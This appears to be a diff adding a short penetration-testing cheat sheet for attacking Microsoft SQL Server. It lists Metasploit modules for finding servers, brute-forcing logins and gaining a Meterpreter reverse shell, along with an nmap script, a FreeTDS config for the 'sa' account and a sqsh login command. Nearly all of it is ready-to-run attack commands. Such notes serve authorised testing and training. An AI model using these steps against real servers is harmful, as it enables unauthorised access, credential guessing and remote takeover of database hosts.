@@ -1,0 +1,21 @@
+> Enumerate MSSQL Servers on the network
+* msf > use auxiliary/scanner/mssql/mssql_ping
+* nmap -sU --script=ms-sql-info $ip
+
+> Bruteforce MsSql
+* msf auxiliary(mssql_login) > use auxiliary/scanner/mssql/mssql_login
+
+> Gain shell using gathered credentials
+* msf > use exploit/windows/mssql/mssql_payload
+* msf exploit(mssql_payload) > set PAYLOAD windows/meterpreter/reverse_tcp
+
+***Log in to a MsSql server:***
+
+# root@kali:~/dirsearch# cat ../.freetds.conf
+[someserver]
+host = $ip
+port = 1433
+tds version = 8.0
+user=sa
+
+* root@kali:~/dirsearch# sqsh -S someserver -U sa -P PASS -D DB_NAME
